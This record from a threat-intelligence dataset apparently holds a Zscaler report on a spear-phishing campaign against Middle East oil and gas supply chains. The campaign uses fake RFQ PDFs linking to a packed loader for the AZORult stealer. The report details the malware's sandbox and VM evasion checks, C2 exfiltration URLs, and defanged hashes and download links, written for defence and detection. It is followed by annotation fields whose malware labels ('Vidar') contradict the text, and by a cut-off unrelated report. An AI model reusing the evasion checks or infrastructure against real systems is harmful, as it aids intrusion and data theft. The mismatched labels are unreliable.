file sharing sites, such as wetransfer and mega.nz where a ZIP archive is hosted.\nThe ZIP archive contains a malicious and packed .NET executable that will decrypt, load, and execute the embedded AZORult binary.\nFigure 1 shows a graphical representation of the attack flow.\n![Figure 1](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%201%20-%20attack%20flow.png)\n*Figure 1: The flow of attack*\n**Email analysis**\nFigure 2 shows an email message that pretends to come from a senior chemist of lab operations of ADNOC Sour Gas.\n![Figure 2](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%202%20_%20email.png)\n*Figure 2: A fake email sent to officials in the supply chain industry in the Middle East.*\nIn all the cases, the emails were sent from Gmail-based address.\nThe two Gmail addresses observed in the attacks were:\n[[email\u00a0protected]](/cdn-cgi/l/email-protection#becddfd2dbcdcdd7d9d3df8689fed9d3dfd7d290ddd1d3)\n[[email\u00a0protected]](/cdn-cgi/l/email-protection#b7c7c5d8d4c2c5dad2d9c399d4dfd2d1c4d1dec5c4c399d4d8daf7d0dad6dedb99d4d8da)\nThe threat actor also leveraged anonymous email services from Tutanota to create emails registered with keemail.me and tuta.io which were also used in this email campaign.\nThe PDF files attached to the email are multipage documents (containing 14 pages) that appear\u00a0to be Requests for Quotations (RFQ) for supply contracts and legal tenders for various projects related to ADNOC and the Doha airport.\nThe decoy documents are carefully crafted to appear legitimate for social engineering purposes.\nThe first page of each document contains the instructions to access the specifications and drawings using embedded download links that lead to malicious ZIP archives as described in the attack flow above.\nSome examples of the content\u00a0in\u00a0the PDFs include:\n**PDF Filename:** PI-18031 Dalma Gas Development Project (Package B) -TENDER BULLETIN-01.pdf\n**MD5 hash:** e368837a6cc3f6ec5dfae9a71203f2e2\nFigure 3 shows a PDF that pretends to be a legitimate Request for Quotation (RFQ) related to the Dalma gas development project.\nIt bears the logo of ADNOC at the top right and the first page contains the malicious download links.\n![Figure 3](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%203%20_%20document%201.png)\n*Figure 3: The fake letter contained in the PDF associated with this attack.*\n**PDF Filename:** AJC-QA HAMAD INTERNATIONAL AIRPORT EXPANSION, DOHA.pdf\n**MD5 hash:** abab000b3162ed6001ed8a11024dd21c\nFigure 4 shows a PDF that\u00a0pretends to be a Request for Quotation for Hamad International Airport expansion plan for Doha\u00a0and supposedly comes from a supply chain trading contractor in Qatar.\n![Figure 4](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%204%20-%20document%202.png)\n*Figure 4: The fake RFQ for a local airport expansion project.*\n### **Threat attribution**\nThe threat actor is specifically interested in Middle East targets, such as organisations in the supply chain and government sectors of the Middle East, especially the United Arab Emirates\u00a0(UAE) and Qatar.\nBased on the target recipients of the email, the contents of the email, and the attached PDF files, along with the metadata and infrastructure analysis, we conclude that this is a targeted attack on organisations in the Middle East.\n### **Metadata analysis**\nAfter investigating the metadata of PDF files, we were able to discover several PDFs that we associate with the same threat actor.\nThe distribution method has been used in the wild from January 2020 through\u00a0May 2020 in low volume.\nStarting from July 2020, we observed an increase in the activity of this threat actor, returning with a new campaign.\nThe metadata of the PDF files indicates that they were generated using Microsoft Office Word 2013.\nThe\u00a0only unique author names used in all the PDF samples were:\nDonor1\nMr. Adeel\nFigure 5 shows an example of the metadata for the PDF file with the MD5 hash\u00a0e368837a6cc3f6ec5dfae9a71203f2e2.\n![Figure 5](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%205%20-%20PDF%20metadata.png)\n*Figure 5: The metadata of one of the PDFs used in this campaign.*\nThe complete list of all the PDF samples identified in this campaign is provided in the Appendix.\n###\n### **Infrastructure analysis**\nIn addition to the contents of the emails and the documents\u00a0that were used for threat attribution, we can also infer from the Command and Control (C&C)\u00a0infrastructure that the threat actor has specifically chosen a C&C server that blends with the theme.\nThe C&C\u00a0server in the samples we discovered was\u00a0crevisoft.net.\nAt the time of analysis, this domain was resolving to the IP address\u00a0167.114.57.136.\nWe observed that this domain, when accessed directly, would redirect to a service consulting company from Egypt hosted at\u00a0crevisoft.com as shown in Figure 6.\n![Figure 6](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%206%20-%20legitimate%20site.png)\n\u00a0*Figure 6: A legitimate Middle East-based site hosted at crevisoft.com.*\nAll of the following four\u00a0domains would redirect to the above domain:\ncrevisoft.net\ncis.sh\ncrevisoft.org\ncrevisoft.co\nWith a high confidence level, we can conclude that this threat actor is interested in stealing information and gaining access to infrastructure of supply chain-related organisations located in the Middle East.\n###\n### **Technical analysis of the .NET payload**\nFor the purpose of technical analysis, we will consider the .NET binary with MD5 hash: 84e7b5a60cd771173b75a775e0399bc7\nThis payload, which is present inside the downloaded ZIP archive, is a packed and obfuscated .NET binary.\nBased on static analysis, we can see that the payload pretends to be a Skype application with spoofed metadata as shown in Figure 7.\n![Figure 7](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%207%20-%20.NET%201.png)\n*Figure 7: Metadata of the main .NET executable.*\nUpon execution, it unpacks another payload that is embedded in the resource section.\nFigure 8 shows the custom algorithm that decrypts the payload using a hardcoded key \u201cGXR20\u201d.\n![Figure 8](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%208%20-%20.NET%202.png)\n*Figure 8: The subroutine used to decrypt the second stage .NET DLL.*\n###\n### **Second stage**\nFigure 9 shows the decrypted payload, which is a .NET DLL with the **MD5 hash**\u00a00988195ab961071b4aa2d7a8c8e6372d and the name\u00a0Aphrodite.dll\n![Figure 9](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%209%20-%20.NET%203.png)\n*Figure 9: The unpacked and loaded second stage DLL called Aphrodite.*\nThe code execution is transferred to the DLL by creating an object for class named \u201cMortiz.Anton\u201d along with the following three parameters, as shown in Figure 10.\nugz1: \u201cddLPjs\u201d (name of the bitmap image resource)\nugz3: \u201dKKBxPQsGk\u201d (the decryption key)\nprojName: \u201cSkype\u201d (name of the project of main executable)\n![Figure 10](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2010%20-%20.NET%204.png)\n*Figure 10: The code control passed to the Aphrodite DLL.*\nThis DLL further unpacks another binary, which is embedded as a bitmap image in the resource section of the main executable, as shown in Figure 11.\n![Figure 11](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2011%20-%20.NET%205.png)\n*Figure 11: The bitmap image inside the resource section that contains the next stage payload.*\nSimilar to the second stage (Aphrodite), it is also encrypted with a custom algorithm.\nThe custom algorithm is based on XOR using the key indicated by the parameter\u00a0ugz3**.**\n###\n### **Third stage**\nThe resulting unpacked binary is a .NET DLL with **MD5 hash**\u00a0ae5f14478d5e06c1b2dc2685cbe992c1 and the name\u00a0Jupiter.\nThe code control is transferred to the third stage DLL via a call to one of its routines as shown in Figure 12.\n![Figure 12](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2012%20-%20.NET%206.png)\n*Figure 12: The unpacked and loaded third stage DLL called Jupiter.*\nThis third stage DLL uses various methods to detect the presence of a virtualization or an analysis environment.\n###\n### **Evasion techniques**\nBelow is a summary of the methods used by this DLL to detect the analysis environment.\n### **Registry checks:**\nRegistry key: \"HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi Port 0\\\\Scsi Bus 0\\\\Target Id 0\\\\Logical Unit Id 0\"\nValue: \"Identifier\"\nData contains: \"VBOX\" OR \"VMWARE\" OR \"QEMU\"\nRegistry key: \"HARDWARE\\\\Description\\\\System\"\nValue: \"SystemBiosVersion\"\nData contains: \"VBOX\" OR \"QEMU\"\nRegistry key: \"HARDWARE\\\\Description\\\\System\"\nValue: \"VideoBiosVersion\"\nData contains: \"VIRTUALBOX\"\nChecks if key present: \"SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions\" OR \"SOFTWARE\\\\VMware, Inc.\\\\VMware Tools\"\nRegistry key: \"HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi Port 1\\\\Scsi Bus 0\\\\Target Id 0\\\\Logical Unit Id 0\"\nValue: \"Identifier\"\nData contains: \"VMWARE\"\nRegistry key: \"HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi Port 2\\\\Scsi Bus 0\\\\Target Id 0\\\\Logical Unit Id 0\"\nValue: \"Identifier\"\nData contains: \"VMWARE\"\nRegistry key: \"SYSTEM\\\\ControlSet001\\\\Services\\\\Disk\\\\Enum\"\nValue: \"0\"\nData contains: \"VMWARE\"\nRegistry key: \"SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\"\nValue: \"DriverDesc\"\nData contains: \"VMWARE\"\nRegistry key:\n\"SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\Settings\"\nValue: \"Device Description\"\nData contains: \"VMWARE\"\nRegistry key: \"SOFTWARE\\\\VMware, Inc.\\\\VMware Tools\"\nValue: \"InstallPath\"\nData contains: \"C:\\\\PROGRAM FILES\\\\VMWARE\\\\VMWARE TOOLS\\\\\"\n**Wine environment detection:**\nChecks if the export functions of kernel32.dll contains: wine\\_get\\_unix\\_file\\_name\n**Windows Management Instrumentation (WMI) query-based****checks:**\nWMI Query: \"SELECT * FROM Win32\\_VideoController\"\nProperty: \"Description\"\nChecks for the presence of the following keywords in the description field:\n* \"VM Additions S3 Trio32/64\"\n* \"S3 Trio32/64\"\n* \"VirtualBox Graphics Adapter\"\n* \"VMware SVGA II\"\n* \"VMWARE\"\n**DLL name-based checks:**\nChecks for the presence of a DLL with the name: \"SbieDll.dll\" in the process address space.\n**Username-based\u00a0checks:**\nChecks if the system username contains either of the following strings:\n* \"USER\"\n* \"SANDBOX\"\n* \"VIRUS\"\n* \"MALWARE\"\n* \"SCHMIDTI\"\n* \"CURRENTUSER\"\n**Filename or filepath-based checks:**\nFilePath contains: \"//VIRUS\" OR \"SANDBOX\" OR \"SAMPLE\" OR \"C:\\\\file.exe\"\n**Window class check:**\n\"Afx:400000:0\"\nAfter all the above environment checks are performed, the AZORult payload (**MD5 hash:** 38360115294c49538ab15b5ec3037a77)\u00a0is injected using the process hollowing technique in a new instance of the main process.\nWe will not describe the details of the functionality of AZORult information stealer since it is already well-documented in the public domain.\nIt is important to note that based on the flow of the code execution and the anti-analysis techniques used, the .NET packed payload appears to be created using the CyaX packer.\nMore details about this packer can be found here.\n### **Network communication**\nThe final unpacked payload, AZORult, will perform information stealing activities on the machine and exfiltrate the information by sending an HTTP POST request to the URL: hxxp://crevisoft.net/images/backgrounds/ob/index.php\nUpon inspection, we discovered that opendir was enabled on the C&C server as shown in Figure 13.\n![Figure 13](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2013%20-%20opendir.png)\n*Figure 13: Opendir enabled on the C&C server.*\nThe AZORult panel on the C&C server can be accessed atthe URL:hxxp://crevisoft.net/images/backgrounds/ob/panel/admin.php.\n![Figure 14](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2014%20-%20panel.png)\n*Figure 14: The AZORult panel*\n###\n### **PHP mailer script**\nAmong other artifacts we discovered on the C&C server, we found a PHP mailing script deployed at\u00a0hxxp://crevisoft[.]net/images/-/leaf.php.\nThis enables the threat actor to send emails using the C&C server\u2019s SMTP.\n![Figure 15](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2015%20-%20mailer%20script.png)\n*Figure 15: The PHP mailing script on the C&C server.*\n###\n### **Zscaler Cloud Sandbox detection**\nFigure 16 shows the Zscaler Cloud Sandbox successfully detecting this .NET-based threat.\n![Figure 16](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2016%20-%20Sandbox.png)\n*Figure 16: Zscaler Cloud Sandbox detection.*\nIn addition to sandbox detections, Zscaler\u2019s multilayered cloud security platform detects indicators at various levels, as seen here:\n[Win32.PWS.Azorult](https://threatlibrary.zscaler.com/?keyword=Win32.PWS.Azorult)\n[Win64.PWS.Azorult](https://threatlibrary.zscaler.com/?keyword=Win64.PWS.Azorult)\n[PDF.Downloader.Azorult](https://threatlibrary.zscaler.com/?keyword=PDF.Downloader.Azorult)\n### **Conclusion**\nThis threat actor is targeting employees in the supply chain industries in Oil and Gas sector in the middle east region.\nAs always, users should be cautious when receiving emails out of the blue, even if those emails appear to be\u00a0related to something you are interested in, such as a legal tender for a project which might appear relevant.\nAnd always be wary of links embedded inside file formats such as PDF since these links\u00a0could lead to download of malicious files on your system.\nThe Zscaler ThreatLabZ team will continue to monitor this campaign, as well as others, to help keep our customers\u00a0safe.\n### **MITRE ATT&CK TTP Mapping**\n| **ID** | **Tactic** | **Technique** |\n| T1566.001 | Spearphishing Attachment | Uses PDF attachments containing malicious URLs |\n| T1204.002 | User Execution: Malicious File | User opens pdf file.\nClick the URL link.\nDownloads ZIP file.\nExtracts zip file and executes the binary.\n|\n| T1140 | Deobfuscate/Decode Files or Information | Strings and other data are obfuscated in the payload.\n|\n| T1036.005\u00a0 | Masquerading: Match Legitimate Name or Location | File names used related to projects directly linked to the Middle East.\n|\n| T1027.002\u00a0 | Obfuscated Files or Information: Software Packing | Payloads are packed with a multilayer packer.\n|\n| T1497 | Virtualization/Sandbox Evasion | Uses Registry, WMI, UserName-based anti-VM techniques |\n| T1134.002 | Access Token Manipulation: Create Process with Token | One of AZORult capabilities |\n| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  | One of AZORult capabilities |\n| T1140 | Deobfuscate/Decode Files or Information\u00a0\u00a0\u00a0\u00a0  | One of AZORult capabilities |\n| T1573.001 | Encrypted Channel: Symmetric Cryptography | One of AZORult capabilities |\n| T1083 | File and Directory Discovery | One of AZORult capabilities |\n| T1070.004 | Indicator Removal on Host: File Deletion | One of AZORult capabilities |\n| T1105 | Ingress Tool Transfer | One of AZORult capabilities |\n| T1057 | Process Discovery | One of AZORult capabilities |\n| T1055.012 | Process Injection: Process Hollowing | One of AZORult capabilities |\n| T1012 | Query Registry  | One of AZORult capabilities |\n| T1113 | Screen Capture | One of AZORult capabilities |\n| T1082 | System Information Discovery | One of AZORult capabilities |\n| T1016 | System Network Configuration Discovery | One of AZORult capabilities |\n| T1033 | System Owner/User Discovery | One of AZORult capabilities |\n| T1124 | System Time Discovery | One of AZORult capabilities |\n| T1552.001 | Unsecured Credentials: Credentials In Files | One of AZORult capabilities |\n### **Indicators of compromise**\n**Scheduled task names**\n**Naming convention**: \u201cUpdates\\<random\\_string>\u201d\nUpdates\\YJSlNpkH\nUpdates\\WWOsRUUn\nUpdates\\NcojkRtJmDPru\n**XML file names**\nScheduled tasks are created using dropped XML files in %temp% directory with random names.\nC:\\Users\\user\\AppData\\Local\\Temp\\tmp9AA2.tmp\nC:\\Users\\user\\AppData\\Local\\Temp\\tmp23B7.tmp\nC:\\Users\\user\\AppData\\Local\\Temp\\tmp24CC.tmp\n**Dropped filenames**\nFiles are dropped in the \u201cAppData\\Roaming\u201d directory with the same name as a scheduled task.\nC:\\Users\\User\\AppData\\Roaming\\YJSlNpkH.Exe\nC:\\Users\\User\\AppData\\Roaming\\WWOsRUUn.Exe\nC:\\Users\\user\\AppData\\Roaming\\NcojkRtJmDPru.exe\n**File hashes**\n**PDF hashes**\n**Author: Donor1**\ne368837a6cc3f6ec5dfae9a71203f2e2\n741f66311653f41f226cbc4591325ca4\nfe928252d87b18cb0d0820eca3bf047a\n8fe5f4c646fd1caa71cb772ed11ce2e5\nd8e3637efba977b09faf30ca49d75005\nc4380b4cd776bbe06528e70d5554ff63\n34cae3ae03a2ef9bc4056ca72adb73fc\n363030120a612974b1eb53cc438bafcb\n2710cc01302c480cd7cd28251743faf0\n1693f1186a3f1f683893b41b91990773\n7a016c37fa50989e082b7f1ca2826f04\n709895dd53d55eec5a556cf1544fc5b9\n5d9ed128316cfa8ee62b91c75c28acd1\nc2ac9c87780e20e609ba8c99d736bec1\n269cfd5b77ddf5cb8c852c78c47c7c4c\n653f85816361c108adc54a2a1fadadcf\n6944f771f95a94e8c1839578523f5415\n8e5c562186c39d7ec4b38976f9752297\n3d019ede3100c29abea7a7d3f05c642b\n67f178fd202aee0a0b70d153b867cb5e\n39598369bfca26da8fc4d71be4165ab4\n70a92fdba79eaca554ad6740230e7b9a\n9db3d79403f09b3d216ee84e4ee28ed3\nbafdeef536c4a4f4acef6bdea0986c0b\n8d7785c8142c86eb2668a3e8f36c5520\n653e737fd4433a7cfe16df3768f1c07e\nebdcb07d3de1c8d426f1e73ef4eb10f4\nd258ba34b48bd0013bfce3308576d644\na74c619fd61381a51734235c0539e827\n6f1bd3cb6e104ed6607e148086b1e171\ncf04d33371a72d37e6b0e1606c7cd9a2\nede5fa9b9af1aeb13a2f54da992e0c37\n5321cd5b520d0d7c9100c7d66e8274e1\nde521f9e4bc6e934bb911f4db4a92d36\n36e5726399319691b6d38150eb778ea7\n1c5cb47fd95373ade75d61c1ae366f8b\nb7b41d93709777780712f52a9acf7a26\n62a05b00c7e7605f7b856c05c89ee748\nb520f4f9d87940a55363161491e69306\n40c1156d98c39ac08fd925d86775586d\n**Author: Mr. Adeel**\nf2319ddb303c2a5b31b05d8d77e08b4e\n24e67f40ccb69edb88cc990099ef2ffe\n54fc7650a8b5c1c8dc85e84732a6d2c7\n9cf615982d69d25b1d0057617bd72a95\ne9dfa14e4f6048b6f3d0201b2f3c62fe\nabab000b3162ed6001ed8a11024dd21c\n5c857bf3cf52609ad072d6d74a4ed443\n73ddf9f8fc3dc81671ea6c7600e68947\n3510cbf8b097e42745cfb6782783af2b\n694a6568b7572125305bdb4b24cebe98\n7fa5028f2394dcea02d4fdf186b3761f\n2260d015eacdc14e26be93fbc33c92aa\nd51d5e4c193617fa676154d1fe1d4802\n912dbb9e0400987c122f73e0b11876c0\n0f4cd9e8111d4eeda89dbe2ce08f6573\nd03fb3e473bd95c314987a1b166a92ed\n549a06cb43563dad994b86e8f105323a\n80149a26ee10786d6f7deaf9fb840314\nc7ced41f38b2d481d1910663a14fbec4\n3ce6cc6dee4563eb752e55103cdb84d4\n**ZIP hashes**\n6d0241bc7d4a850f3067bc40124b3f52\ncdfde809746759074bcd8ba54eb19ccd\n40b5976eb7ddd1d372e34908f74ba0c4\n93c8ed2915d8a3ff7285e0aa3106073e\n2b719eeca275228fbead4c1d3016b8e4\n**Exe hashes**\n42aec0b84a21fa36fc26b8210c197483\n02ae44011006e358a3b1ccbd85ba01f2\n131772a1bb511f2010da66c9c7dca32f\n7860c138e3b8f40bfb6efec08f4a4068\n3bcbe4d2951987363257a0612a107101\n328aa4addb7e475c3721e2ae93391446\n84e7b5a60cd771173b75a775e0399bc7\n3c83b0fe45e15a2fd65ed64a8e1f65e9\nf626e64f57d3b8c840a72bbfbe9fb6ca\nfcf7a9b93cffddf0a242a8fc83845ee3\n**Unpacked file hashes**\n0988195ab961071b4aa2d7a8c8e6372d - Aphrodite\nAe5f14478d5e06c1b2dc2685cbe992c1 - Jupiter\n38360115294c49538ab15b5ec3037a77 - Azorult\n**Unique PDF file names**\n**Author: Donor1**\nRFQ #88556524.pdf\nADNOC RFQ 97571784 - Purchase - core store Mussafah - Tehnical and Commercial.pdf\nALJABER-GROUP-RFQ-38982254237312018-848000071984-03-19-Rev-1.1.pdf\nDalma Gas Development Project (Package B) -TENDER BULLETIN-01.pdf\nRFQ-VENDOR 3 YEARS SUPPLY CONTRACT (RENEWAL OF LTPA 62431092).pdf\n**Author: Mr. Adeel**\nRFQ-ALJ-HAMAD INTERNATIONAL AIRPORT EXPANSION, DOHA.pdf\nRFQ-HAMAD INTERNATIONAL AIRPORT EXPANSION, DOHA QATAR.pdf\nRFQ-HAMAD INTERNATIONAL AIRPORT EXPANSION, DOHA.pdf\nRFQ#ENQ34640-ALJ24.pdf\nAJC-QA HAMAD INTERNATIONAL AIRPORT EXPANSION, DOHA.pdf\n**C&C servers**\nhxxp://crevisoft[.]net/images/backgrounds/ob/index.php\nhxxp://nsseinc[.]com/lingo/index.php\n**Email address**\n[[email\u00a0protected]](/cdn-cgi/l/email-protection#0e7d6f626b7d7d6769636f36394e69636f6762206d6163)\n**ZIP hosted URLs:**\n**Author of PDF: Donor1**\nhxxps://we[.]tl/t-lBcWz3Rcbs\nhxxps://mega[.]nz/#!Ov41xapb!M-COPorpfcQ7j1G61afFVruLbDVwzNfujRIwERqlIQw\nhxxps://we[.]tl/t-P2Lt34YUcf\nhxxps://we[.]tl/t-7XwI9xNjQj\nhxxps://we[.]tl/t-AgAdhMTWIm\nhxxps://mega[.]nz/file/fkImWKab#zvyeMmsYgGiu-hK-FT0o4OBozg0r4gWPRUtAr6iRvwM\nhxxps://we[.]tl/t-utJr50o6uf\nhxxp://bit[.]ly/32qQFah\nhxxps://mega[.]nz/file/zsIB2aLK#pyTNpp8H4pZhpq0i7w0OB8itu3Rj\\_02n9BksARDrlzc\nhxxps://mega[.]nz/#!nrozSBoL!Pc5ApemPW46RC8b0kgiTIyuIa0MnQV9GDUPXGK8\\_\\_LM\nhxxps://we[.]tl/t-TbbBN9VnEZ\nhxxps://mega[.]nz/#!KuRElKZT!5F\\_FfxkyPI7tvJ-mnL7LppAU5X5wA1XbpTM-z8DpVB8\nhxxps://mega[.]nz/file/q55WVIKB#zm3CTH6XEv63mwacATKpo2AMe7yjFmp-KpQXUBkhZJ4\nhxxp://bit[.]ly/3a3CwSX\nhxxps://we[.]tl/t-MFcMWYK7HL\nhxxps://mega[.]nz/#!Tmw0EK5Q!zSLa\\_Ell7Ti5sz-ca-plgqc4vZM7S813Hb9Yk5Jk81Y\nhxxps://we[.]tl/t-0NlciPHf5y\nhxxps://mega[.]nz/#!y6w1BAqS!DMfA221sRvIyqVqPNhsKMZEAtBNkjY\\_jLUWEmCpxMfo\nhxxps://mega[.]nz/#!j2JSwQYb!LaAP2L2WBKLU3DlR6BViQxZ4b8fsmt53Hl3RKHMfb4w\nhxxps://mega[.]nz/file/Ptp1CL6R#EvbG9Gh435cDmmXXyU1\\_l4dM3Bq9fP2B8VdjirGiK\\_c\nhxxps://we[.]tl/t-feLBFQVV1P\nhxxps://we[.]tl/t-ad5X6peqHj\nhxxps://www[.]dropbox[.]com/s/cym2723azwnb364/ADNOC%202020%20REQUEST%20FOR%20QUOTATION-REQUEST%20FOR%20TENDER%20CODE%2076384\\_pdf[.]zip?dl=0\nhxxps://we[.]tl/t-uwwupT1WNc\nhxxps://mega[.]nz/#!K6xgGCYJ!1cJY91IlILLrGGrDVVrkbb7vNRKL9CAFD4tB9\\_jP8ts\nhxxps://mega[.]nz/#!yrBGmQBA!EhgekpU4VUafMvfJKlNVFej1KsgxYWv1mfzCKXejjEc\nhxxps://we[.]tl/t-ZcyzrvcBkP\nhxxps://mega[.]nz/file/GpB3VIyS#3-tKCJ8d-y782IN0570wHMMKQ244ttzBRpUmFXh6LZQ\nhxxps://mega[.]nz/#!OvJFjQaY!UBgEDtTE\\_Gn4B4vYrn-d7rYeO5CBMTxt83NyXQGWh0E\nhxxps://mega[.]nz/file/G5YmjCYJ#jvqrZX2ZLXn3SAI9nzf8w6mWtxTM4\\_fwx7VzHdqzfqM\nhxxps://mega[.]nz/#!zygWnKAS!5kp8IWNec2HK-YPK2gk-hmLa416PZLtr6VpbNZediSk\nhxxps://mega[.]nz/#!uu40wQxJ!HXlLJw7KDJgqnpwCzgrnBt9vu\\_W1-FZlSIvn0JU5rDw\nhxxps://mega[.]nz/#!66hWzACL!\\_6klTwfD-JaSkwjWrKRIBqX1ghXr-SZGk1Utc2-VJPc\nhxxps://www[.]aljaber-llc[.]com/projects/files/ALJABER-RFQ-38982254237312018-848000071984-04-23-Rev-1[.]1[.]zip\nhxxps://we[.]tl/t-cJa4jY9Egz\nhxxps://we[.]tl/t-Out44emJ9t\nhxxps://we[.]tl/t-QuCLQY3cTh\nhxxps://we[.]tl/t-nMKuKWbMlE\nhxxps://mega[.]nz/file/f1RTVa4A#2uGmQV64RKkNYZEECYXFKjGPS-nalF2ZshufSgqsA\\_k\nhxxps://we[.]tl/t-oAkwGNORsR\nhxxps://we[.]tl/t-cFvm5QQlyV\nhxxps://www[.]dropbox[.]com/s/5b0bti9r6xhf3pq/ADNOC%202020%20REQUIREMENT%20TENDER%20RFQ%2056774387\\_PDF[.]zip?dl=0\nhxxps://we[.]tl/t-Didobux8kG\nhxxps://we[.]tl/t-FkBOHwy1ME\nhxxps://mega[.]nz/file/u7xRlS7T#I8L3NL\\_zi-JizZagSF-E1Gcj5I8ednV6YdqyWs5RnNo\nhxxps://we[.]tl/t-XsVO5hewBu\n**Author of PDF: Mr. Adeel**\nhxxps://we[.]tl/t-NwSigkLd2E\nhxxps://we[.]tl/t-wQB6ioE8dL\nhxxps://we[.]tl/t-u3NL7Wnplr\nhxxps://we[.]tl/t-zC6Wz4CpfZ\nhxxps://we[.]tl/t-5wQSJsFUlC\nhxxps://we[.]tl/t-egfvdBvESW\nhxxps://we[.]tl/t-2a9aq4LJSn\nhxxps://we[.]tl/t-4BnTk2Hwiv\nhxxps://we[.]tl/t-hSqtTJDi1f\nhxxps://we[.]tl/t-1VyVEAtzAf\nhxxps://we[.]tl/t-E1iDs5Bghr\nhxxps://we[.]tl/t-YlbV0AIU5b\nhxxps://we[.]tl/t-1yLti4IfaN\nhxxps://we[.]tl/t-dGN9sRTnch\nhxxps://we[.]tl/t-spOqYklJIQ\nhxxps://we[.]tl/t-cunxjPBouY\nhxxps://we[.]tl/t-39SvbwCY2E\nhxxps://we[.]tl/t-9RVc3dflK6\nhxxps://we[.]tl/t-aBUVx3EMdx\nhxxps://we[.]tl/t-XdOjUbrcK8\nhxxps://we[.]tl/t-MkUZugwABd\nhxxps://we[.]tl/t-ikxwkPtSBi\nhxxps://we[.]tl/t-1hWeuMe1h7\nhxxps://we[.]tl/t-2L7ajlJSCG\nhxxps://we[.]tl/t-HZygDd5TUJ\nhxxps://we[.]tl/t-MtgNnMbTij", "mitre_ids": ["T1566", "T1566", "T1566", "T1566", "T1027", "T1059", "T1140", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "TA0011", "TA0011", "TA0011", "T1566", "TA0011", "TA0010", "TA0001", "T1059", "T1059", "T1027", "T1059", "T1036", "T1059", "T1059", "TA0002", "T1140", "T1059", "T1059", "T1140", "T1059", "T1059", "T1140", "T1059", "T1140", "T1027", "T1059", "T1027", "T1027", "T1059", "T1059", "T1140", "T1497", "T1497", "T1497", "T1497", "T1497", "T1055", "T1497", "T1059", "T1140", "TA0009", "T1048", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "T1566", "TA0011", "T1566", "T1566", "T1566", "T1566", "T1204", "T1204", "T1204", "T1204", "TA0002", "T1036", "T1027", "T1027", "T1497", "T1497", "T1134", "T1555", "T1573", "T1083", "T1070", "T1057", "T1113", "T1082", "T1016", "T1033", "T1124", "T1552", "T1053", "T1053", "T1053", "TA0011"], "anno_name_label": [["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["TOOL", "CyaX packer"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"]], "cti_entity_class": ["CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE"]}, {"cti_report": "Election 2020-themed scams and threat activities\nNovember 03, 2020\nThe United States presidential election is here.\nAnd as COVID-19 still runs unchecked throughout the world, 2020 continues to be an outlier year in so many ways.\nBut one thing remains constant\u2014scammers and threat actors taking advantage of current topics for their own profit.\nStrangely, this is probably the most normal aspect of 2020 thus far.\nCybercriminals\u00a0will target users from every conceivable method possible, leveraging their email scams, SMS phishing (SMiShing), typo-squatting, domain-squatting, and malvertising in an attempt to collect sensitive information from the user or worse.\nWith\u00a0many companies operating under an indefinite work-from-home order, it\u2019s important to keep your professional and personal devices safe and secure.\nFollowing your IT\u2019s best practice security awareness training is still the best way to educate yourself, but real-world examples are necessary to illustrate its necessity.\nThis being an election year, the additional outreach that most Americans are 